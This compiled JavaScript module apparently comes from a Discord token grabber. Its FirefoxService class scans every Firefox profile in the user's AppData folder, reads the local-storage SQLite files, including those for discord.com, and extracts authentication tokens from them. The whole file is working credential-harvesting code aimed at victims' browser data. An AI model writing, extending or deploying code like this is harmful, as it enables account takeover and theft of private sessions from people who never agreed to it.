"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.FirefoxService = void 0;
const Bluebird = require("bluebird");
const fs = require("promise-fs");
const path = require("path");
const os = require("os");
const storage_1 = require("@assasans/storage");
const service_1 = require("./service");
class FirefoxService extends service_1.Service {
    constructor(name, directory) {
        super(name, directory);
    }
    async getTokens() {
        const tokens = new storage_1.List();
        const profilesDirectory = path.join(os.homedir(), 'AppData', this.directory, 'Profiles');
        if (!await this.exists(profilesDirectory))
            return tokens;
        const profileDirectories = (await fs.readdir(profilesDirectory, { encoding: 'utf8' }))
            .map((relative) => path.join(profilesDirectory, relative));
        await Bluebird.all(profileDirectories.map(async (profileDirectory) => {
            try {
                if (!(await fs.stat(profileDirectory)).isDirectory())
                    return;
            }
            catch (error) {
                console.error(error);
                return;
            }
            try {
                const storagePath = path.join(profileDirectory, 'webappsstore.sqlite');
                if (!await this.exists(storagePath))
                    return;
                const content = await fs.readFile(storagePath, { encoding: 'utf8' });
                tokens.addRange(this.extractTokens(content));
            }
            catch (error) {
                console.error(error);
            }
            try {
                const archivePath = path.join(profileDirectory, 'storage/ls-archive.sqlite');
                if (!await this.exists(archivePath))
                    return;
                const content = await fs.readFile(archivePath, { encoding: 'utf8' });
                tokens.addRange(this.extractTokens(content));
            }
            catch (error) {
                console.error(error);
            }
            try {
                const storageDirectoryRoot = path.join(profileDirectory, 'storage/default');
                if (!await this.exists(storageDirectoryRoot))
                    return;
                const storageDirectories = (await fs.readdir(storageDirectoryRoot, { encoding: 'utf8' }))
                    .filter((name) => /discord(?:app)?\.com/.test(name))
                    .map((relative) => path.join(profileDirectory, relative));
                await Bluebird.all(storageDirectories.map(async (storageDirectory) => {
                    try {
                        if (!(await fs.stat(storageDirectory)).isDirectory())
                            return;
                    }
                    catch (error) {
                        console.error(error);
                        return;
                    }
                    try {
                        const storagePath = path.join(storageDirectory, 'ls/data.sqlite');
                        if (!await this.exists(storagePath))
                            return;
                        const content = await fs.readFile(storagePath, { encoding: 'utf8' });
                        tokens.addRange(this.extractTokens(content));
                    }
                    catch (error) {
                        console.error(error);
                    }
                }));
            }
            catch (error) {
                console.error(error);
            }
        }));
        return tokens;
    }
}
exports.FirefoxService = FirefoxService;
//# sourceMappingURL=firefox.js.map